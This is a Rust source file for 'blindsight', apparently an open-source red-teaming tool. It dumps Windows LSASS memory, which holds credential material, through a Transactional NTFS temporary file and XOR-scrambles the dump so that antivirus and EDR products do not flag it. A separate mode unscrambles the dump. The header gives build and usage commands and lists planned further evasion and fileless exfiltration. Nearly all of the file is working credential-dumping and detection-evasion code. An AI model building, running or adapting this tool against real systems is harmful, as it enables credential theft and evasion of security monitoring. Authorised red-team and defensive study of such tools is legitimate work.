//!
//! blindsight - Dump LSASS memory bypassing countermeasures
//! Copyright (c) 2024 Marco Ivaldi <raptor@0xdeadbeef.info>
//!
//! > "There's no such things as survival of the fittest.  
//! > Survival of the most adequate, maybe.  
//! > It doesn't matter whether a solution's optimal.  
//! > All that matters is whether it beats the alternative."  
//! >  
//! > -- Peter Watts, Blindsight (2006)  
//!
//! Red teaming tool to dump LSASS memory, bypassing basic countermeasures.
//! It uses Transactional NTFS (TxF API) to transparently scramble the memory
//! dump, to avoid triggering AV/EDR/XDR.
//!
//! ## See also
//! * [Mitre](https://attack.mitre.org/techniques/T1003/001/)
//! * [Synacktiv](https://www.synacktiv.com/en/publications/windows-secrets-extraction-a-summary)
//! * [RT Notes](https://www.ired.team/offensive-security/credential-access-and-credential-dumping)
//! * [nanodump](https://github.com/fortra/nanodump)
//! * [minidump](https://github.com/w1u0u1/minidump)
//! * [CredBandit](https://github.com/anthemtotheego/CredBandit)
//! * [RustRedOps](https://github.com/joaoviictorti/RustRedOps)
//! * [Dumpy](https://github.com/Kudaes/Dumpy)
//!
//! ## Cross-compiling (macOS example)
//! ```sh
//! $ brew install mingw-w64
//! $ rustup target add x86_64-pc-windows-gnu
//! $ cargo build --release --target x86_64-pc-windows-gnu
//! ```
//!
//! ## Usage
//!
//! Inside an Administrator's PowerShell window:
//! ```sh
//! PS C:\> .\blindsight.exe [dump | file_to_unscramble.log]
//! ```
//!
//! ## Examples
//! Dump LSASS memory:
//! ```sh
//! PS C:\> .\blindsight.exe
//! ```
//!
//! Unscramble memory dump:
//! ```sh
//! PS C:\> .\blindsight.exe 29ABE9Hy.log
//! ```
//!
//! ## Tested on
//! * Microsoft Windows 10 (x64)
//! * Microsoft Windows 11 (x64)
//! * Microsoft Windows 11 (ARM64)
//! * Microsoft Windows Server 2016 (x64)
//! * Microsoft Windows Server 2019 (x64)
//! * Microsoft Windows Server 2022 (x64)
//!
//! *Note: Do not test on production servers, as accessing LSASS might cause system instability!*
//!
//! ## TODO
//! * Optimize memory usage (simply corrupt "magic bytes" instead of XORing?)
//! * Use litcrypt2 or similar to encrypt strings locally
//! * Allow to manually specify LSASS pid to avoid noisy process scans
//! * Avoid directly opening LSASS handle (e.g., via PssCaptureSnapshot)
//! * Use <https://github.com/Kudaes/DInvoke_rs> or similar for API hooks evasion
//! * <https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-3.html>
//! * Implement fileless exfiltration channels (e.g., TFTP, FTP, HTTP...)
//! * Consider dumping to memory using minidump callbacks instead of TxF API
//! * <https://adepts.of0x.cc/hookson-hootoff/>
//! * Consider better command line handling if minimal is not enough
//!

use std::error::Error;
use std::fs::File;
use std::io::{Read, Write};
use std::path::PathBuf;
use std::ptr;
use std::slice;

use rand::distributions::Alphanumeric;
use rand::prelude::*;

use sysinfo::System;

use windows::core::{PCSTR, PCWSTR};
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::Storage::FileSystem::*;
use windows::Win32::System::Diagnostics::Debug::*;
use windows::Win32::System::Memory::*;
use windows::Win32::System::Threading::*;

const LSASS: &str = "lsass.exe";
const DUMP: &str = ".\\lsass.dmp";
const KEY: &[u8] = b"DEADBEEF";

/// Dispatch to function implementing the selected action
pub fn run(action: &str) -> Result<(), Box<dyn Error>> {
    match action {
        "dump" => dump()?,
        _ => unscramble(action)?,
    }

    Ok(())
}

/// Dump LSASS memory to scrambled output file
fn dump() -> Result<(), Box<dyn Error>> {
    // Create output file with a random name
    let path = format!(".\\{rand}.log", rand = rand_str(8));
    println!("[*] Trying to dump to output file: {path}");
    let path = PathBuf::from(path);
    let mut out_file = File::create_new(path)?;
    println!("[+] Successfully created output file");

    // Get LSASS pid
    let pid = lsass_pid()?;
    println!("[+] Found {LSASS} pid: {pid}");

    // Open LSASS process
    let proc_handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid)? };
    println!("[+] Successfully opened {LSASS} handle: {proc_handle:?}");

    // Create NTFS transaction object (TxF API)
    let txf_handle = unsafe {
        CreateTransaction(
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            0,
            0,
            INFINITE,
            PCWSTR(ptr::null_mut()),
        )?
    };

    // Create intermediate output file as a transacted operation
    let mut filename = format!(".\\{rand}.log", rand = rand_str(8));
    let file_ptr = filename.as_mut_ptr();
    let file_handle = unsafe {
        CreateFileTransactedA(
            PCSTR(file_ptr),
            FILE_GENERIC_READ.0 | FILE_GENERIC_WRITE.0,
            FILE_SHARE_WRITE,
            None,
            CREATE_NEW,
            FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
            None,
            txf_handle,
            Some(std::ptr::from_ref::<TXFS_MINIVERSION>(
                &TXFS_MINIVERSION_DIRTY_VIEW,
            )),
            None,
        )?
    };

    // Dump LSASS memory to intermediate output file
    unsafe {
        MiniDumpWriteDump(
            proc_handle,
            pid,
            file_handle,
            MiniDumpWithFullMemory,
            None,
            None,
            None,
        )?;
    };
    println!("[+] Dump successful!");

    // Map a view of the intermediate file into our address space
    let map_handle = unsafe { CreateFileMappingW(file_handle, None, PAGE_READONLY, 0, 0, None)? };
    let ptr = unsafe {
        MapViewOfFile(map_handle, FILE_MAP_READ, 0, 0, 0)
            .Value
            .cast::<u8>()
    };

    // Scramble dump using a temporary vector to hold data
    let size = unsafe { GetFileSize(file_handle, None) } as usize;
    let data = unsafe { slice::from_raw_parts_mut(ptr, size) };
    println!(
        "[*] Scrambling dump and writing {len} bytes to disk",
        len = data.len()
    );

    let mut dump = vec![0u8; size];
    dump.clone_from_slice(data);
    scramble(&mut dump, KEY);

    // Write scrambled dump to output file
    let count = out_file.write(&dump)?;
    println!("[+] Done writing {count} bytes to disk!");

    // Cleanup
    unsafe {
        CloseHandle(map_handle)?;
        CloseHandle(file_handle)?;
        CloseHandle(txf_handle)?;
        CloseHandle(proc_handle)?;
    }

    Ok(())
}

/// Get LSASS pid
fn lsass_pid() -> Result<u32, Box<dyn Error>> {
    // Load system information
    let mut sys = System::new_all();
    sys.refresh_all();

    // Find LSASS process
    let proc = sys
        .processes_by_exact_name(LSASS.as_ref())
        .next()
        .ok_or("Process not found")?;

    // Return pid
    Ok(proc.pid().as_u32())
}

/// Scramble a slice of bytes in place
fn scramble(data: &mut [u8], key: &[u8]) {
    xor(data, key);
}

/// Unscramble a memory dump
fn unscramble(path: &str) -> Result<(), Box<dyn Error>> {
    // Open and read input file
    println!("[*] Trying to read from input file: {path}");
    let mut in_file = File::open(path)?;
    let mut buf = Vec::<u8>::new();
    in_file.read_to_end(&mut buf)?;
    println!("[+] Successfully read from input file");

    // Unscramble dump
    println!(
        "[*] Trying to unscramble {len} bytes to output file: {DUMP}",
        len = buf.len()
    );
    xor(buf.as_mut_slice(), KEY);

    // Write unscrambled dump to output file
    let mut out_file = File::create_new(DUMP)?;
    let count = out_file.write(&buf)?;
    println!("[+] Done writing {count} bytes to disk!");

    Ok(())
}

/// XOR a slice of bytes with a key in place
fn xor(data: &mut [u8], key: &[u8]) {
    data.iter_mut()
        .zip(key.iter().cycle())
        .for_each(|(byte, key_byte)| *byte ^= key_byte);
}

/// Generate a random string
fn rand_str(size: usize) -> String {
    thread_rng()
        .sample_iter(&Alphanumeric)
        .take(size)
        .map(char::from)
        .collect()
}
